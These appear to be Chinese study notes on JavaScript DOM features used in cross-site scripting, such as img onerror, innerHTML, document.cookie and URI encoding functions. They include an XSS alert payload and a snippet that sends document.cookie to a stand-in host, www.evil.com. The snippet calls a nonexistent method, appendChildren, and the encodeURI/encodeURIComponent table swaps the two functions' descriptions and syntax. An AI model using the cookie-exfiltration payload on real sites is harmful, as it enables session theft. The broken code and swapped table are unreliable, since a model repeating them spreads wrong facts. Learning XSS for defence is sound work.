## JavaScript

#### 常见属性

##### img

* onerror：外部文件加载错误时执行

  ~~~html
  <img src=# onerror=alert(/xss2/)  />
  ~~~

#### HTML DOM

##### innerHTML属性

>Element.innerHTML 属性设置或获取HTML语法表示的元素的后代。
>
>Note: 如果一个 `<div>`,` <span>`, 或 `<noembed> `节点有一个文本子节点，该节点包含字符 (&), (<),  或(>), innerHTML 将这些字符分别返回为&amp;, &lt; 和 &gt; 。使用Node.textContent  可获取一个这些文本节点内容的正确副本。
>
>如果要向一个元素中插入一段 HTML，而不是替换它的内容，建议使用 `insertAdjacentHTML() `方法。
>
>>使用 `insertAdjacentHTML `插入用户输入的HTML内容的时候，需要转义之后才能使用。
>>
>>如果只是为了插入文本内容（而不是HTML节点），不建议使用这个方法，建议使用`node.textContent` 或者 `node.insertAdjacentText()`。因为这样不需要经过HTML解释器的转换，性能会好一点。

##### document对象

* createElement

  > 新创建的 Element 节点，具有指定的标签名。

* cookie

  > 获取并设置与当前文档相关联的 cookie。

* body

  > 返回当前文档中的`<body>`元素或者`<frameset>`元素
  >
  > >`<frame> `是 HTML 元素，它定义了一个特定区域，另一个 HTML 文档可以在里面展示。[已经从 Web 标准中删除，`<iframe> `(HTML内联框架元素)更应该提倡。]
  > >
  > >`<frameset> `是一个用于包含 <frame> 的 HTML 元素。[已经从 Web 标准中删除]

  * appendChildren

    > appendChild() 方法向节点添加最后一个子节点。

  ~~~JavaScript
  var img=document.createElement("img");
  img.src="http://www.evil.com/log?"+escape(document.cookie);
  document.body.appendChildren(img);
  ~~~

  

##### submit()方法

> 该方法提交表单的方式与用户单击 Submit 按钮一样；
>
> 表单的 onsubmit 事件句柄不会被调用

#### 常见函数

##### escape

> 对字符串进行编码（对特殊字符编码， * @ - _ + . /除外）。JavaScript1.5中不推荐使用。使用 encodeURI() 或 encodeURIComponent() 代替。

| 函数   | encodeURI()                                       | encodeURIComponent()                                         |
| ------ | ------------------------------------------------- | ------------------------------------------------------------ |
| 功能   | 转义除了`A-Z a-z 0-9 - _ . ! ~ * ' ( )`的所有字符 | 假定一个URI是完整的URI，那么无需对那些保留的并且在URI中有特殊意思的字符进行编码。<br/>encodeURI 会替换所有的字符，但不包括以下字符，即使它们具有适当的UTF-8转义序列：<br/>保留字符`; , / ? : @ & = + $`<br/>非转义的字符`字母 数字 - _ . ! ~ * ' ( )`<br/>数字符号`#` |
| 语法   | encodeURIComponent(str);                          | encodeURI(URI)                                               |
| 参数   | str：String. URI 的组成部分。                     | 一个完整的URI                                                |
| 返回值 | 原字串作为URI组成部分被被编码后的新字符串。       | 一个新字符串, 表示提供的字符串编码为统一资源标识符 (URI)。<br/>无法产生能适用于HTTP GET 或 POST 请求的URI |

~~~javascript
var set1 = ";,/?:@&=+$";  // 保留字符
console.log(encodeURI(set1)); // ;,/?:@&=+$
console.log(encodeURIComponent(set1)); // %3B%2C%2F%3F%3A%40%26%3D%2B%24

var set2 = "-_.!~*'()";   // 不转义字符
console.log(encodeURI(set2)); // -_.!~*'()
console.log(encodeURIComponent(set2)); // -_.!~*'()

var set3 = "#";           // 数字标志
console.log(encodeURI(set3)); // #
console.log(encodeURIComponent(set3)); // %23

var set4 = "ABC abc 123"; // 字母数字字符和空格
console.log(encodeURI(set4)); // ABC%20abc%20123
console.log(encodeURIComponent(set4)); // ABC%20abc%20123
~~~



























参考资料

1. [白帽子讲web安全]()

2. [MDN Web Docs](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/insertAdjacentHTML)

3. [菜鸟教程]()

4. [w3school]()